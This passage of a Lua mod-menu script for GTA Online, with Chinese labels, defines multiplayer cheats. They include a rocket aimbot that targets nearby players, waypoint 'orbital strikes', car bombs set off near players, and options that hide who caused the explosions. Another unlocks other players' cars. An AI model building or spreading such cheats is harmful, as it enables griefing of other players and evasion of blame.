                            end
                            CAM.DESTROY_CAM(Missile_Camera, true)
                        end
                    end
                    --improve this logic lmfao
                    if missile_settings.multitarget then
                        table.remove(MISSILE_ENTITY_TABLE, GetValueIndexFromTable(MISSILE_ENTITY_TABLE, plocalized))
                        util.toast("Removed value " .. tostring(plocalized) .. " at index " .. tostring(GetValueIndexFromTable(MISSILE_ENTITY_TABLE, p)))
                    end
                end)
            end
            util.yield()
        end
    else
        MISL_AIM = false
    end
end)

local rpgrockets = menu.list(pvphelp, "火箭炮类型设置", {}, "")

local function generateRockets()
    for i = 1, #Rocket_Hashes do
        menu.action(rpgrockets, "Rocket " .. Rocket_Hashes[i][1], {"rocket " .. Rocket_Hashes[i][1]}, "", function ()
            Chosen_Rocket_Hash = Rocket_Hashes[i][2]
            util.toast("Set chosen rocket to " .. Rocket_Hashes[i][1] .. " || " .. Rocket_Hashes[i][2])
        end)
    end
end

generateRockets()

local rpgsettings = menu.list(pvphelp, "RPG自动瞄准器设置", {"rpgsettings"}, "")

menu.toggle(rpgsettings, "启用标枪模式", {"rpgjavelin"}, "让火箭飞得很高，杀死离你最近的玩家 :) | 建议：结合“RPG LOS Remove”，向你看不到的目标开火。", function (on)
    if on then
        MISL_AIR = true
    else
        MISL_AIR = false
    end
end)

menu.slider(rpgsettings, "RPG自动瞄准器半径", {"msl_frc_rad"}, "导弹自瞄的射程，例如 人可以离开多远。", 1, 10000, 300, 10, function (value)
    missile_settings.radius = value
end)

menu.slider(rpgsettings, "RPG速度倍增器", {"msl_spd_mult"}, "速度乘数。 默认是100，很好。", 1, 10000, 100, 10, function (value)
    missile_settings.speed = value
end)

menu.toggle(rpgsettings, "RPG LOS删除", {}, "删除视线检查。 除非您知道自己在做什么，否则不要打开它。", function (on)
    missile_settings.los = not on
end)

menu.toggle(rpgsettings, "RPG 行车记录器", {"rpgcamera"}, "现在有了行车记录仪，如果你使用标枪模式，你终于可以知道你的火箭到底去哪儿了。", function (on)
    missile_settings.cam = on
end)

menu.toggle(rpgsettings, "启用 PTFX", {}, "启用导弹的粒子效果，使它们看起来更合法。 默认启用。", function (toggle)
    missile_settings.ptfx = toggle
end, true)

menu.toggle(rpgsettings, "只针对空中目标", {}, "使自瞄只瞄准那些在空中的人。", function (toggle)
    missile_settings.air_target = toggle
end)

menu.toggle(rpgsettings, "多目标", {}, "将使导弹瞄准不同的实体。 如果一枚导弹已经飞向一个实体，其他导弹将飞向其他实体。 对多人有用。", function (toggle)
    missile_settings.multitarget = toggle
end)

menu.toggle(rpgsettings, "目标 Peds（多目标）", {}, "将针对peds而不是玩家。 在这个上启用了多目标，因为如果不是这样就没有用。", function (toggle)
    missile_settings.multiped = toggle
end)

menu.divider(rpgsettings, "------- PTFX（高级） -------")

menu.slider(rpgsettings, "PTFX 比例", {"rpgparscale"}, "粒子效果的比例。", 1, 10, 1, 1, function (scale)
    missile_settings.ptfx_scale = scale
end)

menu.text_input(rpgsettings, "PTFX 名称", {"rpgptfx"}, "粒子效果名称。 仅限高级用户。", function (text)
    missile_particles.name = text
end, "exp_grd_rpg_lod")

menu.text_input(rpgsettings, "PTFX 字典", {"rpgdictionary"}, "使用 PTFX 的粒子效果字典。 仅限高级！！", function (text)
    missile_particles.dictionary = text
end, "core")


menu.divider(pvphelp, "轨道标点")


menu.action(pvphelp, "轨道打击标点", {"orbway", "orbwp"}, "轨道炮您选择的航点。", function ()
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local wpos = HUD.GET_BLIP_COORDS(blip)
        if ORB_Sneaky then
            for a = 1, 30 do
                SE_add_explosion(wpos.x, wpos.y, wpos.z + 30 - a, 29, 10, true, false, 1, false)
                SE_add_explosion(wpos.x, wpos.y, wpos.z + 30 - a, 59, 10, true, false, 1, false)
                util.yield(30)
            end
        else
            for i = 1, 30 do
                SE_add_owned_explosion(GetLocalPed(), wpos.x, wpos.y, wpos.z + 30 - i, 29, 10, true, false, 1)
                SE_add_owned_explosion(GetLocalPed(), wpos.x, wpos.y, wpos.z + 30 - i, 59, 10, true, false, 1)
                util.yield(30)
            end
        end
    else
        util.toast("没标点！")
    end
end)

menu.toggle(pvphelp, "偷偷摸摸的爆炸", {}, "使轨道不归咎于你。", function (on)
    ORB_Sneaky = on
end)


menu.divider(pvphelp, "汽车自杀")

menu.toggle_loop(pvphelp, "汽车自杀", {"carexplode"}, "当您在玩家旁边时自动引爆您的汽车。", function()
    local ourped = GetLocalPed()
    if PED.IS_PED_IN_ANY_VEHICLE(ourped, false) then
        local pedTable = entities.get_all_peds_as_pointers()
        local ourCoords = ENTITY.GET_ENTITY_COORDS(ourped)
        for i = 1, #pedTable do
            local handle = entities.pointer_to_handle(pedTable[i])
            if PED.IS_PED_A_PLAYER(handle) then
                local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                local v3 = entities.get_position(pedTable[i])
                local dist = DistanceBetweenTwoCoords(ourCoords, v3)
                if dist < 5 and handle ~= GetLocalPed() and not CAR_S_BLACKLIST[playerID] then
                    if CAR_S_sneaky then
                        SE_add_explosion(ourCoords.x, ourCoords.y, ourCoords.z, 2, 10, true, false, 0.1, false)
                        SE_add_explosion(ourCoords.x - 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x + 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x, ourCoords.y - 4, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x, ourCoords.y + 4, ourCoords.z, 2, 20, false, true, 0.1, false)
                    else
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y, ourCoords.z, 2, 10, true, false, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x - 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x + 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y - 4, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y + 4, ourCoords.z, 2, 20, false, true, 0.1)
                    end
                end
            end
        end
    end
end)

menu.toggle(pvphelp, "偷偷摸摸的爆炸", {"carexplodesneaky"}, "使汽车炸弹的爆炸不怪你。", function(on)
    CAR_S_sneaky = on
end)


menu.divider(pvphelp, "合法的快速射击")

menu.toggle(pvphelp, "合法的快速射击（快速切换）", {"legitrapidfire"}, "射击后快速切换到手榴弹并返回武器。 对狙击手、角色扮演游戏、榴弹发射器很有用。", function(on)
    local localped = GetLocalPed()
    if on then
        LegitRapidFire = true
        util.create_thread(function ()
            while LegitRapidFire do
                if PED.IS_PED_SHOOTING(localped) then
                    local currentWpMem = memory.alloc()
                    local junk = WEAPON.GET_CURRENT_PED_WEAPON(localped, currentWpMem, 1)
                    local currentWP = memory.read_int(currentWpMem)
                    memory.free(currentWpMem)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, 2481070269, true) --2481070269 is grenade
                    util.yield(LegitRapidMS)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, currentWP, true)
                end
                util.yield()
            end
            util.stop_thread()
        end)
    else
        LegitRapidFire = false
    end
end)

menu.slider(pvphelp, "合法的快速射击延迟（ms）", {"legitrapiddelay"}, "切换到手榴弹并返回武器所需的延迟。", 1, 1000, 100, 50, function (value)
    LegitRapidMS = value
end)

menu.divider(pvphelp, "")

local SE_Notifications = false
menu.toggle(pvphelp, "调试通知", {""}, "", function(on)
    SE_Notifications = on
end)


carfly = menu.list(menu.my_root(), "载具选项", {}, "", function(); end)

local carweaponfun = menu.list(carfly, "载具武器", {}, "", function(); end)

ff9car = menu.list(carweaponfun, "电磁脉冲道奇战马", {}, "生成带有电磁脉冲功能的道奇战马")

Spawn = menu.toggle_loop(ff9car, '生成电磁脉冲道奇战马', {'FF9Wspawn'}, '生成带有电磁脉冲功能的道奇战马', function ()
    spawnspecialcar()
end)

sdroot = menu.list(carweaponfun, '魔幻激光战马', {}, '')

SDspawn = menu.toggle_loop(sdroot, '生成魔幻激光战马', {'lsdspawn'}, '魔幻战马可以发出激光', function ()
    Lazer_Space_Car()
end)

local vehicleWeaponRoot = menu.list(carweaponfun, "载具武器", {"vehicleweapons"}, "")

menu.toggle_loop(vehicleWeaponRoot, "载具镭射", {"vehiclelasers"}, "", function ()
	vehlaser()
end)

menu.toggle_loop(vehicleWeaponRoot, "载具武器", {}, "", function()
	vehweapon_veh()
end, function () 
    state = 0 
end)

menu.list_select(vehicleWeaponRoot, "设置载具武器", {}, "", {{util.get_label_text("WT_V_SPACERKT")}, {util.get_label_text("WT_RAYPISTOL")},{util.get_label_text("WT_FWRKLNCHR")}, {util.get_label_text("WT_V_TANK")}, {util.get_label_text("WT_V_PLRBUL")}}, 1, function (index)
    setvehweapon(index)
end)

local list_homingMissiles = menu.list(vehicleWeaponRoot, "先进追踪导弹", {}, "允许您在任何载具上使用追踪导弹，并一次射出最多六个目标 ..")
local toggle

toggle = menu.toggle_loop(list_homingMissiles, "先进追踪导弹", {"homingmissiles"}, "", function ()
	if not UFO.exists() and not GuidedMissile.exists() then
		HomingMissiles.mainLoop()
	else
		menu.set_value(toggle, false)
	end
end, HomingMissiles.reset)


local whiteList = menu.list(list_homingMissiles, "白名单", {}, "")
menu.toggle(whiteList, "朋友", {}, "", HomingMissiles.SetIgnoreFriends)
menu.toggle(whiteList, "组织成员", {}, "", HomingMissiles.SetIgnoreOrgMembers)
menu.toggle(whiteList, "帮会成员", {}, "", HomingMissiles.SetIgnoreCrewMembers)


menu.slider(list_homingMissiles, "最大目标数" , {}, "", 1, 6, 6, 1, HomingMissiles.SetMaxTargets)


menu.toggle_loop(carweaponfun, "空袭飞机", {"airstrikeplane"}, "使用任何飞机或直升机进行空袭", function ()
    airstrikeaicraft_plane()
end, function()
     state = 0 
end)

menu.textslider(carweaponfun, "UFO", {"ufo"}, "驾驶UFO,使用牵引光束和大炮", {"外星UF0", "军用UFO"}, function (index)
	local obj = ufomodels[index]
	UFO.setObjModel(obj)
	if not (GuidedMissile.exists() or UFO.exists()) then UFO.create() end
end)

rapid_khanjali = menu.toggle_loop(carweaponfun, "TM-02 可汉贾利武器快速射击", {}, "快速切换武器", function()
    tm02fastshot()
end)

local controlSettings = menu.list(carweaponfun, "设置" , {}, "")

local airstrikePlaneControl = menu.list(controlSettings, "空袭飞机", {}, "")

for name, control in pairs(Imputs_vehweapon) do
	local keyboard, controller = control[1]:match('^(.+)%s?;%s?(.+)$')
	local strg = ("%s: %s, %s: %s"):format(trans_plane.Keyboard, keyboard, trans_plane.Controller, controller)
	menu.action(airstrikePlaneControl, strg, {}, "", function()
        Config.controls.airstrikeaircraft = control[2]
        util.show_corner_help(trans_plane.AirstrikeAircraft:format(name))
	end)
end

local vehicleWeaponsControl <const> = menu.list(controlSettings, "载具武器", {}, "")
for name, control in pairs(Imputs_vehweapon) do
	local keyboard, controller = control[1]:match('^(.+)%s?;%s?(.+)$')
	local strg = ("%s: %s, %s: %s"):format(trans_plane.Keyboard, keyboard, trans_plane.Controller, controller)
	menu.action(vehicleWeaponsControl, strg, {}, "", function()
        Config.controls.vehicleweapons = control[2]
    util.show_corner_help(trans_plane.VehicleWeapons:format(name))
	end)
end

local ufoSettings = menu.list(controlSettings, "UFO", {}, "")

menu.toggle(ufoSettings, "禁用玩家框", {}, "", function(toggle)
	Config.ufo.disableboxes = toggle
end, Config.ufo.disableboxes)

menu.toggle(ufoSettings, "仅针对玩家车辆", {}, "使牵引光束忽略非玩家驾驶的载具", function(toggle)
	Config.ufo.targetplayer = toggle
end, Config.ufo.targetplayer)

local unlockplayerveh = menu.list(carfly, "解锁载具", {}, "", function(); end)

menu.toggle_loop(unlockplayerveh, "载具引擎快速开启", {}, "减少载具启动引擎时间", function()
    fastoncar()
end)

menu.toggle_loop(unlockplayerveh, "解锁正在进入的载具", {}, "解锁你正在进入的载具。对于锁住的玩家载具也有效果。", function()
    unlockcar()
end)

HandlingData =
{
	reference = 0,
	name = "",
	address = NULL,
	visible = true,
	offsets = {},
	open = false,
}
HandlingData.__index = HandlingData


HandlingData.new = function (parent, name, address, offsets)
	local self = setmetatable({address = address, name = name, offsets = offsets}, HandlingData)
	self.reference = menu.list(parent, name, {}, "", function()
		self.open = true
	end, function()
		self.open = false
	end)

	menu.divider(self.reference, name)
	for _, tbl in ipairs(offsets) do self:addOption(self.reference, tbl[1], tbl[2]) end
	return self
end

HandlingData.addOption = function(self, parent, name, offset)
	local value = memory.read_float(self.address + offset) * 100

	menu.slider_float(parent, name, {name}, "", -1e6, 1e6, math.floor(value), 1, function(new)
		memory.write_float(self.address + offset, new / 100)
	end)
end


HandlingData.Remove = function(self)
	menu.delete(self.reference)
end


function HandlingData:get()
	local r = {}

	for _, tbl in ipairs(self.offsets) do
		local value = memory.read_float(self.address + tbl[2])
		r[tbl[1]] = round(value, 3)
	end

	return r
end


function HandlingData:set(values)
	local count = 0

	for _, tbl in ipairs(self.offsets) do
		local value = values[tbl[1]]

		if not value then
			goto label_continue
		end

		memory.write_float(self.address + tbl[2], value)
		count = count + 1

	::label_continue::
	end
end


VehicleList = {selected = 0, root = 0, name = "", onClick = nil}
VehicleList.__index = VehicleList

function VehicleList.new(parent, name, onClick)
	local self = setmetatable({name = name, onClick = onClick}, VehicleList)
	self.root = menu.list(parent, name, {}, "")

	local classLists = {}
	for _, vehicle in ipairs(util.get_vehicles()) do
		local nameHash = util.joaat(vehicle.name)
		local class = VEHICLE.GET_VEHICLE_CLASS_FROM_NAME(nameHash)

		if not classLists[class] then
			classLists[class] = menu.list(self.root, util.get_label_text("VEH_CLASS_" .. class), {}, "")
		end

		local menuName = util.get_label_text(vehicle.name)
		if menuName == "NULL" then
			goto label_coninue
		end

		menu.action(classLists[class], util.get_label_text(vehicle.name), {}, "", function()
			self:setSelected(nameHash, vehicle.name)
			menu.focus(self.root)
		end)
	::label_coninue::
	end

	return self
end

function VehicleList:setSelected(nameHash, vehicleName)
	if not vehicleName then
		vehicleName = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(nameHash)
	end
	menu.set_menu_name(self.root, self.name .. ": " .. util.get_label_text(vehicleName))
	self.selected = nameHash
	if self.onClick then self.onClick(nameHash) end
end


local handlingTrans <const> =
{
	SetVehicle = "设置车辆",
	CurrentVehicle = "当前车辆",
	SaveHandling = "保存操控数据",
	SavedFiles = "已保存的文件",
	Load = "加载",
	Delete = "删除",
	Autoload = "自动加载",
	Saved = "操控数据保存",
	Loaded = "数据文件成功加载",
	WillAutoload = "文件 '%s' 将被自动加载",
	HandlingEditor = "操控编辑器",
	AutoloadedFiles = "自动加载的文件",
	ClickToDelete = "点击删除",
	SavedHelp = "为所选车型保存的数据文件"
}


AutoloadList = {reference = 0, options = {}}
AutoloadList.__index = AutoloadList

function AutoloadList.new(parent, name)
	local self = setmetatable({options = {}}, AutoloadList)

	self.reference = menu.list(parent, name, {}, "")
	return self
end

function AutoloadList:push(vehLabel, file)
	local vehName = util.get_label_text(vehLabel)

	if self.options[vehName] and menu.is_ref_valid(self.options[vehName]) then
		menu.delete(self.options[vehName])
	end

	self.options[vehName] = menu.action(self.reference, string.format("%s: %s", vehName, file), {}, handlingTrans.ClickToDelete, function()
		Config.handlingAutoload[vehLabel] = nil
		menu.delete(self.options[vehName])
		self.options[vehName] = nil
	end)
end


HandlingEditor =
{
	references = {root = 0, meta = 0},
	handlingData = nil,
	subHandlings = {},
	currentVehicle = 0,
	open = false,
	---@type FileList
	filesList = nil,
	---@type AutoloadList
	autoloads = nil
}
HandlingEditor.__index = HandlingEditor


function HandlingEditor.new(parent, name)
	local self = setmetatable({subHandlings = {}, references = {}}, HandlingEditor)
	self.references.root = menu.list(parent, name, {}, "", function()
		self.open = true
	end, function() self.open = false end)


	local vehList = VehicleList.new(self.references.root, handlingTrans.SetVehicle, function (vehicle)
		self:SetCurrentVehicle(vehicle)
	end)


	menu.action(self.references.root, handlingTrans.CurrentVehicle, {}, "", function ()
		local vehicle = entities.get_user_vehicle_as_handle()
		if vehicle ~= 0 then vehList:setSelected(ENTITY.GET_ENTITY_MODEL(vehicle)) end
	end)


	self.references.meta = menu.list(self.references.root, "文件", {}, "")

	menu.action(self.references.meta, handlingTrans.SaveHandling, {}, "", function()
		local ok, msg = self:save()
		if not ok then
			return notification123:help(capitalize(msg), HudColour.red)
		end
		notification123:normal(handlingTrans.Saved, HudColour.blue)
	end)


	local fileOpts <const> =
	{
		handlingTrans.Load,
		handlingTrans.Autoload,
		handlingTrans.Delete,
	}

	self.filesList = FileList.new(self.references.meta, handlingTrans.SavedFiles, fileOpts, "", "json", function (opt, fileName, path)
		if  opt == 1 then
			local ok, msg = self:load(path)
			if not ok then
				return notification:help(capitalize(msg), HudColour.red)
			end
			self:SetCurrentVehicle(self.currentVehicle) -- reloading
			notification123:normal(handlingTrans.Loaded, HudColour.blue)

		elseif opt == 3 then
			os.remove(path)
			self.filesList:reload()

		elseif opt == 2 then
			local name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(self.currentVehicle)
			if name == "CARNOTFOUND" then
				return
			end
			Config.handlingAutoload[name] = fileName
			self.autoloads:push(name, fileName)
			notification123:normal(string.format(handlingTrans.WillAutoload, fileName), HudColour.blue)
		end
	end)

	menu.set_help_text(self.filesList.reference, handlingTrans.SavedHelp)
	self.autoloads = AutoloadList.new(self.references.meta, handlingTrans.AutoloadedFiles)
	return self
end



---@param hash Hash
function HandlingEditor:SetCurrentVehicle(hash)
	if self.handlingData then self:clear() end
	self.currentVehicle = hash
	local root = self.references.root
	local modelInfo = get_vehicle_model_info(hash)
	if modelInfo == NULL then
		return
	end

	local handlingAddress = get_vehicle_model_handling_data(modelInfo)
	if handlingAddress == NULL then
		return
	end

	self.handlingData = HandlingData.new(root, "CHandlingData", handlingAddress, CHandlingData)
	local subHandlings = get_sub_handling_array(handlingAddress)

	for _, subHandling in ipairs(subHandlings) do
		if subHandling.address == NULL then
			continue
		end
		local name = subHandlingClasses[subHandling.type]
		local offsets = SubHandlingData[name]
		if not self.subHandlings[name] then self.subHandlings[name] = HandlingData.new(root, name, subHandling.address, offsets) end
	end

	local vehicleName = memory.read_string(modelInfo + 0x298)
	self.filesList.dir = filesystem.scripts_dir() .. '\\baibaiScript\\' .. "handling\\" .. string.lower(vehicleName) .. "\\"
end



function HandlingEditor:clear()
	self.handlingData:Remove()
	for _, h in pairs(self.subHandlings) do h:Remove() end

	self.handlingData = nil
	self.subHandlings = {}
	self.currentVehicle = 0
	self.filesList.dir = ""
end

local customLabels <const> =
{
	EnterFileName = "输入文件名",
	InvalidChar = "无效字符输入，请重试",
	EnterValue = "输入值",
	ValueMustBeNumber = "该值必须是数字，请重试",
	Search = "输入要搜索的类型",
}

for key, text in pairs(customLabels) do
	customLabels[key] = util.register_label(text)
end


function HandlingEditor:save()
	if not self.handlingData then
		return false, "handling data not found"
	end

	local input = ""
	local label = customLabels.EnterFileName

	while true do
		input = get_input_from_screen_keyboard(label, 31, "")
		if input == "" then
			return false, "save canceled"
		end
		if not input:find '[^%w_%.%-]' then break end
		label = customLabels.InvalidChar
		util.yield(200)
	end

	local data = {}
	data[self.handlingData.name] = self.handlingData:get()

	for _, subHandling in pairs(self.subHandlings) do
		data[subHandling.name] = subHandling:get()
	end

	self.filesList:add(input .. ".json", json.stringify(data, nil, 4))
	return true, nil
end



function HandlingEditor:load(path)
	if not self.handlingData then
		return false, "handling data not found"
	end

	if not filesystem.exists(path) then
		return false, "file does not exist"
	end

	local ok, result = json.parse(path, false)
	if not ok then
		return false, result
	end

	self.handlingData:set(result.CHandlingData)

	for name, subHandling in pairs(self.subHandlings) do
		if result[name] then subHandling:set(result[name]) end
	end

	return true, nil
end


function HandlingEditor:autoload()
	local count = 0

	for vehicle, file in pairs(Config.handlingAutoload) do
		local path =  wiriDir .. "handling\\" .. string.lower(vehicle) .. "\\" .. file .. ".json"
		local modelHash = util.joaat(vehicle)

		self:SetCurrentVehicle(modelHash)
		if  self:load(path) then
			self.autoloads:push(vehicle, file)
			count = count + 1
		end
	end

	if self.handlingData then self:clear() end
	return count
end

g_handlingEditor = HandlingEditor.new(carfly, handlingTrans.HandlingEditor)

local numFilesLoaded = g_handlingEditor:autoload()
util.log("%d 处理加载的文件", numFilesLoaded)

local funfeatures_veh = menu.list(carfly, '载具玩乐', {}, '')

dow_block = 0
driveonwater = false
local ls_driveonwater = menu.toggle(funfeatures_veh, "水上驾驶", {"driveonwater"}, "", function(on)
    driveonwater = on
    if on then
        if driveonair then
            menu.set_value(ls_driveonair, false)
            notification("“空中驾驶”已自动关闭,以防止出现问题。", colors.blue)
        end
    else
        if not driveonair and not walkonwater then
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
        end
    end
end)

doa_ht = 0
driveonair = false
ls_driveonair = menu.toggle(funfeatures_veh, "空中驾驶", {"driveonair"}, "", function(on)
    driveonair = on
    if on then
        local pos = players.get_position(players.user())
        doa_ht = pos['z']
        notification("使用空格键和ctrl键微调驾驶高度!", colors.blue)
        if driveonwater then
            menu.set_value(ls_driveonwater, false)
            notification("水上驾驶已自动关闭,以防止出现问题。", colors.blue)
        end
    end
end)

menu.toggle_loop(funfeatures_veh, "载具平移", {}, "使用左右箭头键使车辆水平移动", function(toggle)
    if player_cur_car ~= 0 then
        local rot = ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0)
        if PAD.IS_CONTROL_PRESSED(175, 175) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
            ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z'], 0, true)
        end
        if PAD.IS_CONTROL_PRESSED(174, 174) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, -1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
            ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z'], 0, true)
        end
    end
end)

vjumpforce = 20
vslamforce = 20
menu.toggle_loop(funfeatures_veh, "载具跳跃", {}, "用你的喇叭使你的车跳跃。", function(toggle)
    if player_cur_car ~= 0 then
        if PAD.IS_CONTROL_JUST_PRESSED(86,86) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, 0.0, 0.0, vjumpforce, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
        end
    end
end)


menu.toggle_loop(funfeatures_veh, "载具猛摔", {}, "与车辆跳跃相反", function(toggle)
    if player_cur_car ~= 0 then
        if PAD.IS_CONTROL_JUST_PRESSED(36,36) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, 0.0, 0.0, -vslamforce, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
        end
    end
end)


menu.slider(funfeatures_veh, "载具跳跃力", {}, "", 1, 300, 20, 1, function(s)
    vjumpforce = s
end)


menu.slider(funfeatures_veh, "载具摔落力", {}, "", 1, 300, 50, 1, function(s)
    vslamforce = s
end)

menu.toggle_loop(funfeatures_veh, "贴地/贴墙", {}, "让你的车停在地上,也能让你粘在墙上。", function(on)
    if player_cur_car ~= 0 then
        local vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        vel['z'] = -vel['z']
        ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 2, 0, 0, -50 -vel['z'], 0, 0, 0, 0, true, false, true, false, true)
    end
end)

menu.action(funfeatures_veh, "载具180", {}, "在保持动力的情况下转弯。建议对此进行绑定。", function(click_type)
    if player_cur_car ~= 0 then
        local rot = ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z']+180, 0, true)
        ENTITY.SET_ENTITY_VELOCITY(player_cur_car, -vel['x'], -vel['y'], vel['z'])
    end
end)

menu.toggle_loop(funfeatures_veh, "按住shift键进行漂移", {}, "你听到了。", function(on)
    if PAD.IS_CONTROL_PRESSED(21, 21) then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    end
end)

local vehicle_workshop_root = menu.list(carfly, "载具车间", {}, "")

cur_v_stance = 0.0
menu.click_slider_float(vehicle_workshop_root, "姿势", {}, "", 0, 200, 0, 1, function(s)
    cur_v_stance = s * -0.001
    if player_cur_car ~= 0 then
        set_vehicle_handling_value(player_cur_car, 0xD0, cur_v_stance)
    end
end)

local country_flags = {"apa_prop_flag_argentina", "apa_prop_flag_australia", "apa_prop_flag_austria", "apa_prop_flag_belgium", "apa_prop_flag_brazil", "apa_prop_flag_canada_yt", "apa_prop_flag_china", "apa_prop_flag_columbia", "apa_prop_flag_croatia", "apa_prop_flag_czechrep", "apa_prop_flag_denmark", "apa_prop_flag_england", "apa_prop_flag_eu_yt", "apa_prop_flag_finland", "apa_prop_flag_france", "apa_prop_flag_german_yt", "apa_prop_flag_hungary", "apa_prop_flag_ireland", "apa_prop_flag_israel", "apa_prop_flag_italy", "apa_prop_flag_jamaica", "apa_prop_flag_japan_yt", "apa_prop_flag_lstein", "apa_prop_flag_malta", "apa_prop_flag_mexico_yt", "apa_prop_flag_netherlands", "apa_prop_flag_newzealand", "apa_prop_flag_nigeria", "apa_prop_flag_norway", "apa_prop_flag_palestine", "apa_prop_flag_poland", "apa_prop_flag_portugal", "apa_prop_flag_puertorico", "apa_prop_flag_russia_yt", "apa_prop_flag_scotland_yt", "apa_prop_flag_script", "apa_prop_flag_slovakia", "apa_prop_flag_slovenia", "apa_prop_flag_southafrica", "apa_prop_flag_southkorea", "apa_prop_flag_spain", "apa_prop_flag_sweden", "apa_prop_flag_switzerland", "apa_prop_flag_turkey", "apa_prop_flag_uk_yt", "apa_prop_flag_us_yt", "apa_prop_flag_wales"}
local flags_fmt = {}
for _, flag in pairs(country_flags) do 
    table.insert(flags_fmt, first_to_upper(flag:gsub('apa_prop_flag_', ''):gsub('_yt', '')))
end

menu.list_action(carfly, "附加标志", {"attachflagtocar"}, "", flags_fmt, function(index, val)
    if player_cur_car ~= 0 then 
        local hash = util.joaat(country_flags[index])
        request_model_load(hash)
        local flag = entities.create_object(hash, players.get_position(players.user()))
        local ht = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car)).z
        ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, player_cur_car, 0, 0, 0, ht, 0, 0, 0, true, false, false, false, 0, true)
    end
end)

local m_shift_up_this_frame = false 
local m_shift_down_this_frame = false 

local manual_transmission_list = menu.list(carfly, "手动变速器", {}, "" )
local manual_mode = false 
menu.toggle(manual_transmission_list, "手动模式", {}, "", function(on)
    manual_mode = on
    while true do 
        if player_cur_car ~= 0 then 
            local addr = entities.get_user_vehicle_as_pointer()
            local cur_gear = entities.get_current_gear(addr)
            local next_gear = entities.get_next_gear(addr)
            if not manual_mode then 
                entities.set_next_gear(addr, next_gear)
                break 
            end
            if m_shift_up_this_frame then
                if cur_gear ~= 6 then
                    entities.set_next_gear(addr, cur_gear + 1)
                end
                m_shift_up_this_frame = false 
            elseif m_shift_down_this_frame then 
                if cur_gear > 1 then 
                    entities.set_next_gear(addr, cur_gear - 1)
                end
                m_shift_down_this_frame = false 
            else
                entities.set_next_gear(addr, cur_gear)
            end
        end
        util.yield()
    end
end)

menu.action(manual_transmission_list, "下一档", {}, "", function()
    if player_cur_car ~= 0 then 
        m_shift_up_this_frame = true 
    end
end)

menu.action(manual_transmission_list, "上一档", {}, "", function()
    if player_cur_car ~= 0 then 
        m_shift_down_this_frame = true 
    end
end)

local plscm = menu.list(carfly, '洛圣都改车王', {}, '')

local pbodym = menu.list(plscm, '身体改造', {}, '仅显示可更改的内容。 如果他们乘坐新车退出车身改装以刷新选项')

local plighm = menu.list(plscm, '灯', {}, '')

local pcolm  = menu.list(plscm, '车辆颜色', {}, '')

local pwmenu = menu.list(plscm, '车轮', {}, '')

local vehmenu = {}
    menu.on_focus(pbodym, function ()
    for _, m in ipairs(vehmenu) do
        menu.delete(m)
    end
    vehmenu = {}
    if not players.exists(players.user()) then
        util.stop_thread()
    end
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    if PED.IS_PED_IN_ANY_VEHICLE(pedm, false) then
        for _, v in pairs(Vehopts) do
            local current = VEHICLE.GET_VEHICLE_MOD(vmod, v[1] -1)
            local maxmods = Getmodcou(players.user(), v[1] - 1)
            if maxmods > 0  then
                local modnames = v[2]
                local s = menu.slider(pbodym, modnames , {''}, '',  -1, maxmods  , current, 1, function (mod)
                    Changemod(players.user(), v[1] -1, mod)
                end)
              table.insert(vehmenu, s)
            util.yield()
            end
        end

          for i, v in pairs(Vehtogs) do
            local current = VEHICLE.IS_TOGGLE_MOD_ON(vmod, v[1] -1)
            local tognames = v[2]
            local t = menu.toggle(pbodym, tognames, {''}, '', function (on)
                VEHICLE.TOGGLE_VEHICLE_MOD(vmod, v[1] - 1, on)
              end, current)         
            table.insert(vehmenu, t)
          util.yield()
        end
    end
end)

local pcolor = {}

menu.list_select(pcolm, '原色', {''}, '更改车辆的原色', Mainc, 1, 
function (t)
    pcolor.prim = t - 1
